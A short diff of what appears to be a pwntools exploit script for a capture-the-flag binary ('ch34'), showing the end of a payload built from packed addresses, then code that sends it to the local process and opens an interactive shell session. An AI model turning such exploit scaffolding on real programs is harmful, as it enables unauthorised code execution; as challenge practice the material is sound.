@@ -85,10 +85,10 @@ payload+=p64(0x0000000004075B0)  # address of exit
 
 
 # SHELLY 
-process = process("ch34")
+proces = process("./ch34")
 
-process.sendline(payload)
-process.recvline()
-process.interactive()
+proces.sendline(payload)
+proces.recvline()
+proces.interactive()
 
 
